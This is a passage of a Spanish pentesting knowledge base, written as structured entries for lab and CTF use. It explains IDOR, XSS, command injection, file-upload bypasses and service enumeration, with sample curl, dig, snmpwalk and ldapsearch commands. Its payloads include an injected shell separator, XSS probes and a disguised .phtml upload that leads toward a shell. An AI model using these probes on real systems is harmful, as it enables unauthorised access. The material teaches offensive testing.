        "summary": "Cambias el ID de un recurso en la URL o el JSON y accedes a datos o acciones de otro usuario porque el backend no revalida el permiso.",
        "que": "Un IDOR (Insecure Direct Object Reference) ocurre cuando la app usa un identificador (un ID numerico, un UUID, un email) para acceder a un recurso, y el backend confia en que 'si conoces el ID, tienes permiso'. Si cambias el ID por el de otro usuario y el backend no revalida que ESE ID te pertenece, accedes a datos o acciones ajenas. BOLA es el mismo bug con nombre mas moderno, centrado en APIs.",
        "porque": "El programador comprueba que ESTAS autenticado (tienes un token valido) pero se olvida de comprobar que ese token tiene permiso sobre ESE recurso concreto. Autenticacion (quien eres) y autorizacion (que puedes tocar) son cosas distintas, y este bug es exactamente confundirlas.",
        "cuando": "En cualquier endpoint que reciba un identificador de recurso: /api/users/{id}, /api/orders/{id}, /invoice/{id}.pdf, ?user_id=. Sospecha mas si los IDs son secuenciales (facil de adivinar) que si son UUIDs (aunque UUIDs filtrados en otra respuesta tambien sirven).",
        "necesitas": [
            "Un endpoint que reciba un identificador de recurso (en la URL, query string o JSON).",
            "Idealmente dos cuentas (o dos recursos propios) para comparar respuestas con distinto ID/token.",
        ],
        "no_aplica": [
            "El backend revalida en cada peticion que el recurso pertenece al usuario autenticado (403/404 al cambiar el ID).",
            "El ID no identifica un recurso privado (es publico por diseno, como el ID de un producto en un catalogo).",
        ],
        "confirmacion": "Con tu sesion, pide el mismo endpoint cambiando el ID por uno que sepas que no es tuyo (otro usuario, otro pedido).",
        "resultado": "Un 200 con datos de otro usuario/recurso (o una accion aceptada sobre un recurso ajeno) confirma el IDOR. Un 403/404 descarta ese endpoint concreto.",
        "senales": [
            "IDs numericos secuenciales en la URL o el JSON de respuesta.",
            "El frontend oculta botones/vistas segun el rol, pero la llamada a la API subyacente no cambia.",
            "Cambiar el ID devuelve 200 con datos que no son tuyos.",
        ],
        "pasos": [
            "Identifica todos los endpoints que reciben un ID de recurso (usuario, pedido, factura, mensaje).",
            "Crea o consigue dos identidades si el reto lo permite; compara la misma llamada con cada una.",
            "Cambia el ID de un recurso propio por uno ajeno y observa la respuesta completa, no solo el codigo HTTP.",
            "Prueba tambien acciones de escritura (PUT/DELETE) sobre IDs ajenos, no solo lectura (GET).",
        ],
        "commands": [
            {
                "cmd": "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\"",
                "why": "Pide un recurso con un ID que probablemente no es el tuyo, usando tu propio token. Si el backend solo mira 'hay token valido' y no 'este token puede ver el 1001', el IDOR se confirma.",
                "out": "Datos de un usuario que no eres tu (nombre, email, direccion) devueltos con 200. Repite con varios IDs cercanos para confirmar el patron.",
            },
        ],
    },
    {
        "id": "xss",
        "title": "Cross-Site Scripting (XSS)",
        "phase": "enumeration",
        "section": "web-inyecciones",
        "summary": "Tu entrada se inserta en el HTML/JS de la pagina sin escapar; un navegador que la visita ejecuta el JavaScript que tu pusiste.",
        "que": "Un XSS ocurre cuando la app mete tu entrada dentro del HTML de una pagina sin neutralizar caracteres especiales (<, >, \"), y el navegador de OTRA persona (o el tuyo) interpreta esa entrada como codigo HTML/JavaScript en vez de texto. Hay tres tipos: reflejado (el payload viaja en la URL/peticion y se refleja en la respuesta inmediata), almacenado (el payload se guarda en la BD y se sirve a cualquiera que vea esa pagina), y DOM-based (el JavaScript del CLIENTE inserta el payload sin pasar por el servidor).",
        "porque": "El HTML no distingue 'texto que el usuario escribio' de 'codigo que el navegador debe ejecutar' salvo que la app escape los caracteres especiales antes de insertarlo. Es la misma causa raiz que [[sqli]] (mezclar dato y codigo), aplicada al navegador en vez de a la base de datos.",
        "cuando": "En cualquier campo cuyo valor termine mostrandose en HTML: comentarios, nombres de perfil, busquedas, mensajes de error que reflejan tu input, parametros de URL que se pintan en la pagina.",
        "necesitas": [
            "Un campo cuyo valor se refleje o se almacene y luego se muestre en HTML.",
            "Para confirmar de forma segura: un payload de ejecucion controlada (alert/console.log), no algo destructivo.",
        ],
        "no_aplica": [
            "La app escapa los caracteres especiales (< se convierte en &lt;) antes de insertar tu texto: aparece como texto literal, no se ejecuta.",
            "Un Content-Security-Policy estricto bloquea la ejecucion de scripts inline, incluso si el HTML se inyecta.",
        ],
        "confirmacion": "Inyecta un payload minimo y visible, como <script>alert(1)</script> o <img src=x onerror=alert(1)>, en el campo sospechoso.",
        "resultado": "Un dialogo de alerta ejecutandose en el navegador (o console.log visible en devtools) confirma que tu HTML/JS se interpreto, no se mostro como texto.",
        "senales": [
            "Tu entrada aparece reflejada tal cual en el HTML de la respuesta (view-source lo confirma).",
            "Un campo de comentario/perfil que otros usuarios ven, sin indicacion de que se sanea.",
            "El payload de prueba dispara el alert/console.log.",
        ],
        "pasos": [
            "Identifica donde se refleja o almacena tu entrada viendo el HTML fuente (no solo lo que se ve renderizado).",
            "Prueba un payload minimo de deteccion (<script>alert(1)</script>); si se filtra, prueba variantes (atributos de evento, distintas etiquetas).",
            "Distingue el tipo: si el payload va en la URL y se refleja al momento, es reflejado; si persiste tras recargar o lo ve otro usuario, es almacenado.",
            "En un CTF/lab, el impacto tipico es robar la cookie de sesion de otro usuario o forzar una accion en su nombre.",
        ],
        "commands": [
            {
                "cmd": "curl -sS \"$URL/search?q=<script>alert(1)</script>\"",
                "why": "Prueba rapida por curl para ver si el payload se refleja SIN escapar en el HTML de respuesta, antes de abrir un navegador.",
                "out": "Busca <script>alert(1)</script> literal en el HTML devuelto (no &lt;script&gt;). Si aparece sin escapar, confirma en un navegador real para ver la ejecucion.",
            },
        ],
    },
    {
        "id": "file-upload",
        "title": "Subida de ficheros a shell",
        "phase": "access",
        "section": "web-ficheros-y-ejecucion",
        "summary": "Un formulario de subida acepta un fichero que el servidor luego EJECUTA; súbelo, encuentra su ruta, y ejecutalo.",
        "que": "Cuando una app permite subir ficheros, el riesgo es doble: que acepte un fichero con codigo ejecutable (un .php, .aspx, .jsp) donde el servidor interpreta ese lenguaje, Y que ese fichero acabe en una ruta accesible por HTTP donde puedas pedirlo. Si ambas cosas se cumplen, subir un fichero se convierte en ejecutar codigo.",
        "porque": "El programador valida de forma incompleta: solo la extension (pero acepta .phtml o doble extension), solo el Content-Type (que tu controlas y puedes falsear), o solo el nombre (pero no el contenido real, los 'magic bytes'). Cualquier validacion que dependa de datos que TU envias es evitable.",
        "cuando": "En cualquier formulario de subida: avatar, adjuntos, importacion de ficheros, subida de temas/plugins (WordPress). Prioriza probarlo si la app es de un stack que ejecuta ficheros interpretados (PHP es el caso mas comun en CTF).",
        "necesitas": [
            "Un formulario o endpoint de subida de ficheros.",
            "Saber (o poder inferir) el lenguaje del backend, para subir la extension correcta (.php, .phtml, .jsp, .aspx).",
        ],
        "no_aplica": [
            "El servidor valida magic bytes Y extension Y Content-Type de forma consistente, y ademas sirve los uploads desde una ruta sin permiso de ejecucion.",
            "Los ficheros subidos se guardan fuera del webroot o se renombran de forma no predecible sin que puedas listarlos.",
        ],
        "confirmacion": "Sube un fichero con extension ejecutable disfrazado de imagen (Content-Type image/png) y comprueba si el servidor lo acepta y donde lo guarda.",
        "resultado": "El fichero se sube sin rechazo y puedes localizarlo (ruta predecible o listado); al pedirlo por HTTP, el servidor lo EJECUTA en vez de servirlo como archivo estatico.",
        "senales": [
            "El formulario solo comprueba la extension del NOMBRE, no el contenido real del fichero.",
            "Puedes predecir o descubrir la ruta donde se guardan los uploads (uploads/, /files/, patron de nombre).",
            "El Content-Type que TU envias en la peticion es el que decide la validacion (facilmente falseable).",
        ],
        "pasos": [
            "Prueba primero un upload normal para entender el flujo: donde se guarda, como se nombra, si redirige a una URL del fichero.",
            "Prueba bypasses de extension: doble extension (shell.php.jpg), extensiones alternativas que el servidor tambien ejecuta (.phtml, .phar), o null byte si el stack es muy viejo.",
            "Si valida Content-Type, cambialo a image/png o similar mientras el contenido sigue siendo tu shell.",
            "Localiza el fichero subido y pidelo por HTTP; si se ejecuta, confirma con un payload minimo antes de una reverse shell completa.",
        ],
        "commands": [
            {
                "cmd": "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
                "why": "Sube un fichero .phtml (extension alternativa que muchos servidores PHP tambien ejecutan) declarando un Content-Type de imagen para intentar pasar validaciones basadas en ese campo.",
                "out": "La respuesta suele indicar exito y a veces la ruta del fichero subido. Si no la da, prueba rutas predecibles (uploads/shell.phtml) o busca un listado de directorio.",
            },
        ],
    },
    {
        "id": "command-injection",
        "title": "Command Injection (inyeccion de comandos de SO)",
        "phase": "enumeration",
        "section": "web-inyecciones",
        "summary": "Un parametro llega sin filtrar a una llamada al sistema operativo (ping, convert, backup); anades un separador de shell y ejecutas lo tuyo.",
        "que": "Ocurre cuando la app construye un comando del sistema operativo concatenando tu entrada (por ejemplo, para hacer ping a una IP que tu escribes) y lo ejecuta con system()/exec()/popen(). Como el shell no distingue 'el argumento que espera la app' de 'un comando nuevo', separadores como ; && | permiten anadir tu propio comando a continuacion.",
        "porque": "El programador confia en que el campo (host, IP, nombre de fichero) solo contendra ese dato, sin validar ni escapar los caracteres especiales de shell. Misma causa raiz que [[sqli]] y [[ssti]]: mezclar dato de usuario con una instruccion que el sistema interpreta.",
        "cuando": "En funciones que 'suenan a' llamar herramientas del sistema: ping, traceroute, nslookup, convertir un fichero, hacer backup, comprobar disponibilidad de un host. Parametros tipicos: host, ip, domain, filename, target.",
        "necesitas": [
            "Un campo que sospeches que llega a una llamada de sistema (ping/convert/backup/etc).",
            "Un comando inocuo para confirmar sin causar dano (id, whoami, hostname, o sleep para blind).",
        ],
        "no_aplica": [
            "La app usa una llamada de sistema PARAMETRIZADA (pasa argumentos como lista, no como string concatenado) o una libreria nativa en vez de invocar el binario del SO.",
            "El campo se valida contra un formato estricto (solo digitos para un ID, regex de IP valida) antes de usarse.",
        ],
        "confirmacion": "Anade un comando inocuo tras un separador de shell: 127.0.0.1; id (o && id, | id segun el shell) en el campo sospechoso.",
        "resultado": "La salida de id (uid=... gid=...) aparece mezclada con la respuesta normal de la app. Eso confirma ejecucion real, no solo un error.",
        "senales": [
            "Un parametro que hace de host/IP/dominio para una operacion de red (ping, traceroute, whois).",
            "Un campo de nombre de fichero usado para convertir, comprimir o procesar con una herramienta externa.",
            "La respuesta tarda mas de lo esperado al anadir '&& sleep 5' (senal de ejecucion incluso sin salida visible).",
        ],
        "pasos": [
            "Identifica el campo que sospechas que llega a una llamada de sistema.",
            "Confirma con un comando inocuo primero (id/whoami/hostname); si no ves output, usa sleep/ping hacia tu maquina para confirmar a ciegas.",
            "Prueba distintos separadores segun el shell del backend: ; && | ` $() en Linux, & | en Windows cmd.",
            "Confirmada la ejecucion, escala a una reverse shell: mira [[reverse-vs-bind]].",
        ],
        "commands": [
            {
                "cmd": "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                "why": "Prueba de confirmacion inocua: si 'host' llega a un ping del sistema, el ; encadena tu comando id sin romper el ping original.",
                "out": "La salida de id (uid=www-data...) mezclada en la respuesta confirma ejecucion. El usuario que veas es con el que tendras shell tras escalar.",
            },
        ],
    },
    {
        "id": "dns-enum",
        "title": "Enumeracion de DNS",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "El DNS revela subdominios, hostnames internos y a veces todo el mapa de la zona si el servidor permite una transferencia.",
        "que": "Enumerar DNS es sacarle al servidor de nombres toda la informacion de dominios y subdominios que gestiona: registros A/AAAA (IPs), MX (correo), TXT (a veces con pistas), y sobre todo intentar una transferencia de zona (AXFR), que si esta mal configurada te da TODOS los registros de golpe, como si te regalaran el mapa completo.",
        "porque": "AXFR existe para que servidores DNS secundarios se sincronicen con el primario, pero si el servidor no restringe quien puede pedirla, cualquiera puede solicitarla y recibir el listado completo de subdominios/hosts internos. Es una mala configuracion clasica, no una vulnerabilidad del protocolo en si.",
        "cuando": "Cuando el recon muestra el puerto 53 abierto, o cuando conoces un dominio del objetivo (visto en un certificado TLS, un email, o la propia room) y quieres descubrir subdominios/hosts internos asociados.",
        "necesitas": [
            "Un dominio conocido del objetivo, o el puerto 53 abierto en el propio servidor DNS.",
        ],
        "no_aplica": [
            "El servidor rechaza la transferencia de zona (respuesta 'Transfer failed' o REFUSED) y no conoces mas nombres para probar por fuerza bruta.",
            "No hay ningun dominio conocido ni servidor DNS accesible para el objetivo.",
        ],
        "confirmacion": "Intenta una transferencia de zona (AXFR) contra el servidor DNS del dominio conocido.",
        "resultado": "Si funciona, una lista completa de registros (subdominios, IPs internas, hostnames) en la respuesta. Si falla, el servidor la tiene bien configurada; pasa a fuerza bruta de subdominios.",
        "senales": [
            "Puerto 53 (TCP/UDP) abierto en el objetivo.",
            "Un hostname en un certificado TLS o un email que revela el dominio interno a enumerar.",
            "dig axfr no devuelve REFUSED sino una lista de registros.",
        ],
        "pasos": [
            "Prueba AXFR directamente contra el servidor DNS del dominio conocido; es rapido y, si funciona, te da todo de golpe.",
            "Si falla, haz fuerza bruta de subdominios con una wordlist y anade los que resuelvan a /etc/hosts.",
            "Cruza los hostnames encontrados con vhosts web ([[lfi]] y el resto de bugs web pueden variar por vhost).",
            "Si el objetivo es un DC de Active Directory, el DNS suele revelar el nombre del dominio y del propio DC: mira [[ad-modelo]].",
        ],
        "commands": [
            {
                "cmd": "dig axfr @$IP dominio.local",
                "why": "Intenta la transferencia de zona directamente. Es la prueba mas rentable: si el servidor la permite, obtienes todos los registros sin fuerza bruta.",
                "out": "Si funciona, una lista completa de registros A/CNAME/MX con nombres de host internos. 'Transfer failed' o REFUSED significa que esta bien configurado.",
            },
        ],
    },
    {
        "id": "ftp-enum",
        "title": "Enumeracion de FTP",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "FTP suele permitir login anonimo; si lo hace, listas y descargas ficheros sin credenciales, y a veces hasta escribes.",
        "que": "FTP (puerto 21) es un protocolo de transferencia de ficheros anterior a la web. Muchas instalaciones dejan habilitado el login 'anonymous' (usuario anonymous, cualquier password) por comodidad o por defecto. Si esta activo, entras sin credenciales y puedes listar, descargar, y a veces subir ficheros segun los permisos del share.",
        "porque": "El login anonimo es una funcionalidad legitima de FTP para descargas publicas, pero cuando se deja activo sobre un share que contiene ficheros sensibles (backups, configs, notas), se convierte en una fuga de informacion gratuita. Es la misma logica que la sesion nula de [[smb-enum]] aplicada a FTP.",
        "cuando": "Siempre que el recon muestre el puerto 21 abierto. Es de las comprobaciones mas baratas: un intento de login anonimo tarda segundos.",
        "necesitas": [
            "El puerto 21 (FTP) abierto en el objetivo.",
        ],
        "no_aplica": [
            "El servidor rechaza el usuario anonymous y no tienes ninguna otra credencial que probar.",
            "El share anonimo esta vacio o solo contiene ficheros publicos sin valor.",
        ],
        "confirmacion": "Conecta con usuario anonymous y password vacia o cualquiera; si el login es aceptado, lista el contenido.",
        "resultado": "Un login exitoso (230 Login successful) seguido de un listado de ficheros/directorios confirma acceso anonimo.",
        "senales": [
            "Puerto 21 abierto en el escaneo de puertos.",
            "El banner de nmap/ftp menciona 'Anonymous FTP login allowed'.",
            "Login con usuario anonymous aceptado.",
        ],
        "pasos": [
            "Prueba login anonimo primero; es gratis y muy comun que funcione en labs.",
            "Si entra, lista y descarga TODO lo accesible; busca configs, backups, claves SSH o notas con credenciales.",
            "Comprueba tambien permisos de escritura (STOR): un FTP anonimo con escritura permite subir un webshell si el mismo directorio se sirve por HTTP.",
            "Cualquier credencial encontrada -> pruebala en otros servicios ([[cracking]] si esta hasheada, reuse si esta en claro).",
        ],
        "commands": [
            {
                "cmd": "ftp $IP",
                "why": "Conecta al servicio FTP para probar el login anonimo de forma interactiva. Cuando pida usuario, prueba anonymous; password, cualquier cosa o vacia.",
                "out": "'230 Login successful' confirma acceso anonimo. Un ls/dir tras entrar te muestra el contenido del share; get descarga ficheros.",
            },
        ],
    },
    {
        "id": "snmp-enum",
        "title": "Enumeracion de SNMP",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "SNMP con la community string 'public' filtra procesos, usuarios y software instalado sin necesitar credenciales reales.",
        "que": "SNMP (puerto 161/UDP) es un protocolo de gestion y monitorizacion de dispositivos de red. Se autentica con una 'community string' en vez de usuario/password; si el dispositivo sigue usando la que trae por defecto ('public' para lectura), cualquiera que la conozca puede consultar una cantidad enorme de informacion del sistema: procesos en ejecucion (con sus argumentos, que a veces llevan credenciales), interfaces de red, software instalado, y en Windows a veces hasta usuarios locales.",
        "porque": "La community string por defecto es publica y conocida (esta en cualquier manual); si el administrador no la cambia, SNMP queda abierto a cualquiera que sepa probarla. No es un fallo del protocolo, es no cambiar una credencial por defecto, igual que [[smb-enum]] con sesiones nulas.",
        "cuando": "Cuando el recon muestra 161/UDP abierto (nmap -sU lo detecta, un escaneo TCP normal NO lo vera). Muy rentable en maquinas de red/infraestructura.",
        "necesitas": [
            "El puerto 161/UDP abierto (necesitas un escaneo UDP explicito para verlo).",
        ],
        "no_aplica": [
            "La community string 'public' es rechazada y no tienes otra candidata que probar.",
            "El puerto aparece 'open|filtered' de forma persistente sin responder a ninguna consulta (UDP filtrado, no un SNMP mal configurado).",
        ],
        "confirmacion": "Consulta con snmpwalk usando la community 'public' (la mas comun por defecto).",
        "resultado": "Una respuesta con datos del sistema (nombre de host, procesos, interfaces) confirma que la community funciona. Timeout repetido sugiere filtrado UDP o community incorrecta (dificil distinguir sin mas pruebas).",
        "senales": [
            "Puerto 161/UDP abierto (solo visible con un escaneo UDP, no en el TCP por defecto).",
            "snmpwalk con 'public' devuelve datos en vez de timeout.",
            "Los datos incluyen procesos con linea de comandos completa, a veces con credenciales en los argumentos.",
        ],
        "pasos": [
            "Confirma el puerto con un escaneo UDP (nmap -sU); un TCP normal no lo detecta.",
            "Prueba la community 'public' primero (la mas comun); si falla, prueba otras por defecto (private, community) o fuerza bruta si el reto lo sugiere.",
            "Vuelca toda la informacion disponible (procesos, software, interfaces) con snmpwalk.",
            "Revisa la linea de comandos de cada proceso: es un sitio clasico donde aparecen credenciales pasadas como argumento.",
        ],
        "commands": [
            {
                "cmd": "snmpwalk -v2c -c public $IP",
                "why": "Vuelca toda la informacion accesible via SNMPv2 con la community 'public', la que casi siempre viene por defecto si nadie la cambio.",
                "out": "Cientos de lineas con datos del sistema. Busca especificamente procesos (hrSWRunParameters) y su linea de comandos completa: ahi caen credenciales a menudo.",
            },
        ],
    },
    {
        "id": "nfs-enum",
        "title": "Enumeracion de NFS",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "NFS lista que directorios exporta y a quien; montarlos revela ficheros del servidor directamente en tu Kali.",
        "que": "NFS (puerto 2049) comparte directorios del servidor para que otras maquinas los monten como si fueran locales. Antes de montar nada, puedes preguntarle al servidor QUE exporta y con que restricciones (showmount). Si un export no restringe por host o usuario, lo montas y navegas sus ficheros como si estuvieras en el servidor.",
        "porque": "NFS confia en el UID/GID que le manda el CLIENTE para decidir permisos, en vez de autenticar de verdad; si tu Kali usa el mismo UID que el dueno de los ficheros en el servidor (o el export no restringe), lees y a veces escribes sin credenciales. Es la base tambien de [[nfs-no-root-squash]], la variante que da privesc directo.",
        "cuando": "Cuando el recon muestra el puerto 2049 (o 111 portmapper) abierto. Compruébalo siempre antes de intentar montar nada a ciegas.",
        "necesitas": [
            "El puerto 2049 (NFS) o 111 (portmapper) abierto.",
            "Un cliente NFS en tu Kali para montar (paquete nfs-common o similar).",
        ],
        "no_aplica": [
            "showmount -e no devuelve ningun export, o todos estan restringidos a hosts que no eres tu.",
            "No tienes forma de montar NFS desde tu maquina de ataque.",
        ],
        "confirmacion": "Pide la lista de exports con showmount -e contra la IP objetivo.",
        "resultado": "Una lista de rutas exportadas (y sus restricciones de host, si las hay). Un export accesible para ti (* o tu rango) confirma que puedes montarlo.",
        "senales": [
            "Puerto 2049 (NFS) o 111 (portmapper) abierto en el escaneo.",
            "showmount -e devuelve al menos un export sin restriccion de host.",
            "Al montar, los ficheros muestran UID/GID numericos en vez de nombres (no coinciden con tus usuarios locales).",
        ],
        "pasos": [
            "Lista los exports disponibles con showmount -e antes de montar nada.",
            "Monta el export en un punto local y navega su contenido como cualquier directorio.",
            "Fijate en los UID/GID de los ficheros: si no coinciden con tu usuario, quiza necesites ajustar tu propio UID para leer/escribir como el dueno.",
            "Si el export tiene no_root_squash, no hace falta ajustar UID de lectura: puedes escalar directamente, ve a [[nfs-no-root-squash]].",
        ],
        "commands": [
            {
                "cmd": "showmount -e $IP",
                "why": "Pregunta al servidor NFS que exporta y a quien, sin montar nada todavia. Es el primer paso obligado antes de montar a ciegas.",
                "out": "Rutas exportadas y su restriccion de host (o * si es abierto a todos). Cada ruta accesible es un candidato a montar y explorar.",
            },
            {
                "cmd": "sudo mount -t nfs $IP:/export /mnt/nfs",
                "why": "Monta el export localmente para navegarlo como un directorio normal. Requiere sudo porque montar sistemas de ficheros es una operacion privilegiada en tu propia maquina.",
                "out": "El contenido del export disponible en /mnt/nfs. Explora en busca de ficheros de config, claves SSH, o binarios que puedas modificar.",
            },
        ],
    },
    {
        "id": "ldap-enum",
        "title": "Enumeracion de LDAP",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "LDAP guarda el directorio de usuarios y grupos de un dominio; un bind anonimo te deja consultarlo sin credenciales.",
        "que": "LDAP (puerto 389, o 636 cifrado) es el protocolo que Active Directory (y otros directorios) usan para almacenar y consultar usuarios, grupos, equipos y su estructura organizativa. Muchos servidores permiten un 'bind anonimo' (conectar sin credenciales) que, aunque limitado, a veces basta para leer el naming context y enumerar usuarios.",
        "porque": "El bind anonimo existe para operaciones basicas de consulta sin necesitar cuenta, pero si el administrador no lo restringe, expone la estructura del directorio (nombres de usuario, grupos, a veces atributos sensibles) a cualquiera que se conecte, sin autenticar. Es el equivalente en AD de la sesion nula de [[smb-enum]].",
        "cuando": "Cuando el recon confirma un DC (puerto 389/636 abierto junto a 88 Kerberos y 445 SMB). Es parte del arranque de la fase AD: mira tambien [[ad-modelo]].",
        "necesitas": [
            "El puerto 389 (LDAP) o 636 (LDAPS) abierto, tipicamente en un DC.",
        ],
        "no_aplica": [
            "El servidor rechaza el bind anonimo (necesitas credenciales validas para cualquier consulta).",
            "No es un entorno AD/LDAP: el puerto 389 no responde o pertenece a otro servicio.",
        ],
        "confirmacion": "Intenta un bind anonimo y pide el naming context base con ldapsearch.",
        "resultado": "Una respuesta con el defaultNamingContext (algo como DC=dominio,DC=local) confirma que el bind anonimo funciona y puedes consultar el directorio.",
        "senales": [
            "Puertos 389/636 abiertos junto a 88 (Kerberos) y 445 (SMB): confirma que es un DC.",
            "ldapsearch sin credenciales (bind anonimo) devuelve resultados en vez de error de autenticacion.",
            "El naming context revela el nombre del dominio en formato DC=...",
        ],
        "pasos": [
            "Prueba el bind anonimo pidiendo el naming context base; te confirma si esta permitido y te da el nombre del dominio.",
            "Si el bind anonimo funciona, enumera usuarios y grupos con una consulta mas amplia (base DN completo).",
            "Con una credencial (aunque sea debil), repite la consulta: el bind autenticado suele revelar mucho mas que el anonimo.",
            "Los usuarios que saques alimentan spraying y roasting: mira [[asrep-kerberoast]].",
        ],
        "commands": [
            {
                "cmd": "ldapsearch -x -H ldap://$IP -s base namingcontexts",
                "why": "Bind anonimo (-x sin credenciales) pidiendo el naming context base. Es la prueba minima: si responde, el bind anonimo esta permitido.",
                "out": "Un defaultNamingContext tipo DC=corp,DC=local. Confirma el nombre del dominio y que puedes seguir consultando sin credenciales.",
            },
            {
                "cmd": "ldapsearch -x -H ldap://$IP -D '' -w '' -b 'DC=corp,DC=local' '(objectClass=user)'",
                "why": "Con el naming context ya conocido, pide todos los objetos de tipo usuario via bind anonimo. Es la enumeracion completa de usuarios sin credenciales.",
                "out": "Una lista de usuarios del dominio con sus atributos visibles. Extrae los nombres para spraying o Kerberoasting.",
            },
        ],
    },
    {
        "id": "smtp-enum",
        "title": "Enumeracion de SMTP",
        "phase": "enumeration",
        "section": "recon-y-servicios",
        "summary": "El servidor de correo a veces confirma si un usuario existe (VRFY/EXPN) o filtra software en el banner.",
        "que": "SMTP (puerto 25, o 587/465) es el protocolo de envio de correo. Algunos servidores mal configurados responden a los comandos VRFY (verifica si un usuario existe) o EXPN (expande una lista de distribucion), lo que te deja confirmar usuarios validos del dominio sin autenticarte. El banner tambien suele filtrar el software y version del MTA.",
        "porque": "VRFY/EXPN son comandos legitimos del protocolo SMTP pensados para diagnostico, pero dejarlos activos sin restriccion permite enumerar cuentas de correo validas (que a menudo son tambien cuentas del sistema o del dominio). Es la misma logica de fuga de informacion que RID brute en [[smb-enum]].",
        "cuando": "Cuando el recon muestra el puerto 25 (o 587/465) abierto. Sirve tanto para sacar usuarios como para entender que servidor de correo corre.",
        "necesitas": [
            "El puerto 25 (o 587/465) abierto en el objetivo.",
        ],
        "no_aplica": [
            "El servidor tiene VRFY/EXPN desactivados (respuesta 'not implemented' o similar) y no hay otra via de enumerar usuarios por SMTP.",
            "El puerto pertenece a un relay externo (no al servidor objetivo) sin relacion con el dominio que atacas.",
        ],
        "confirmacion": "Conecta por SMTP y prueba VRFY con un nombre de usuario probable (root, admin, un nombre visto en otra fuente).",
        "resultado": "Un codigo 250/252 (usuario existe) frente a 550 (no existe) te deja distinguir usuarios validos probando varios nombres.",
        "senales": [
            "Puerto 25/587/465 abierto en el escaneo.",
            "El banner de conexion revela el software MTA y su version.",
            "VRFY responde con codigos distintos segun si el usuario existe o no.",
        ],
        "pasos": [
            "Conecta y observa el banner: a veces ya revela el software y version.",
            "Prueba VRFY con nombres candidatos (usuarios ya vistos en otras fuentes, nombres comunes).",
            "Si VRFY esta desactivado, prueba EXPN sobre listas de distribucion conocidas o comunes.",
            "Los usuarios confirmados alimentan spraying ([[fuerza-bruta-online]]) contra otros servicios del objetivo.",
        ],
        "commands": [
            {
                "cmd": "nc -nv $IP 25",
                "why": "Conecta directamente por SMTP para leer el banner (revela software/version) e interactuar a mano con VRFY/EXPN.",
                "out": "Un banner tipo '220 mail.corp.local ESMTP Postfix'. Desde esta sesion, escribe VRFY usuario y observa el codigo de respuesta.",
            },
        ],
    },
    {
        "id": "api-testing-model",
        "title": "Modelo de pruebas de API",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
        "summary": "Mapear endpoints, metodos, parametros y respuestas antes de intentar explotar una API.",
        "que": "Una API expone contratos HTTP que deben probarse por recurso, metodo, entrada y contexto de identidad.",
        "porque": "Un inventario incompleto hace que se pierdan endpoints administrativos, versiones antiguas o metodos menos visibles.",
        "cuando": "Cuando la aplicacion usa JSON, rutas /api, documentacion OpenAPI, GraphQL o clientes SPA.",
        "no_aplica": ["No aporta mucho si solo existe una pagina estatica sin peticiones de datos ni autenticacion."],
        "confirmacion": "Identifica al menos un endpoint funcional, su metodo, parametros y una respuesta reproducible.",
        "resultado": "Dispones de un mapa de recursos y de una lista priorizada para probar autenticacion y autorizacion.",
        "necesitas": ["URL base", "captura de trafico o documentacion", "cuenta de laboratorio"],
        "senales": ["rutas /api", "respuestas JSON", "OpenAPI/Swagger", "versiones v1/v2"],
        "pasos": ["Descubre rutas y metodos.", "Repite peticiones con entradas controladas.", "Anota diferencias de estado y permisos."],
        "commands": [
            {"cmd": "curl -sS $URL/swagger.json", "why": "Busca un contrato OpenAPI publicado.", "out": "Listado de rutas, metodos y esquemas."},
            {"cmd": "curl -sS -i -X OPTIONS \"$URL/api/resource\"", "why": "Comprueba metodos aceptados por un recurso.", "out": "Cabeceras Allow y respuesta del endpoint."},
        ],
    },
    {
        "id": "auth-session-security",
        "title": "Autenticacion y sesiones en APIs",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
        "summary": "Entender login, cookies, tokens, expiracion y cambios de contexto durante una prueba.",
        "que": "La autenticacion demuestra quien eres; la sesion conserva ese contexto entre peticiones.",
        "porque": "Errores de expiracion, cookies o validacion de tokens pueden convertir una cuenta limitada en acceso persistente.",
        "cuando": "Cuando ves endpoints de login, refresh, logout, cookies de sesion o cabeceras Bearer.",
        "no_aplica": ["No lo priorices si el objetivo no tiene estado ni ningun mecanismo de identidad."],
        "confirmacion": "Obtienes una peticion autenticada y compruebas que el mismo recurso cambia sin ese contexto.",
        "resultado": "Sabes que material autentica la sesion, cuanto dura y como se invalida.",
        "necesitas": ["dos cuentas de laboratorio", "captura de login", "token o cookie de prueba"],
        "senales": ["Set-Cookie", "Authorization: Bearer", "refresh_token", "401/403"],
        "pasos": ["Captura el flujo de login.", "Repite con y sin token.", "Comprueba expiracion y logout."],
        "commands": [
            {"cmd": "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"", "why": "Verifica el contexto de identidad actual.", "out": "Perfil o respuesta autenticada."},
            {"cmd": "curl -sS -i \"$URL/api/me\"", "why": "Compara el endpoint sin credenciales.", "out": "401/403 o respuesta publica."},
        ],
    },
    {
        "id": "jwt-security",
        "title": "Seguridad de JWT",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
        "summary": "Inspeccionar claims, algoritmo, expiracion y validacion de tokens JWT.",
        "que": "JWT transporta claims firmados; la seguridad depende de validar firma, algoritmo, audiencia y tiempos.",
        "porque": "Aceptar tokens manipulados o mal emitidos permite cambiar identidad, permisos o caducidad.",
        "cuando": "Cuando la API usa tokens con tres segmentos separados por puntos.",
        "no_aplica": ["No aplica si la sesion usa exclusivamente cookies opacas sin JWT."],
        "confirmacion": "Decodifica header y payload sin alterar el token original y registra los claims observados.",
        "resultado": "Conoces el algoritmo, claims sensibles y comprobaciones que debes intentar validar en laboratorio.",
        "necesitas": ["JWT de laboratorio", "endpoint que lo acepte", "permiso para probar alteraciones"],
        "senales": ["alg", "exp", "sub", "role", "aud"],
        "pasos": ["Decodifica header y payload.", "Comprueba expiracion y audiencia.", "Valida que cambios invaliden la firma."],
        "commands": [
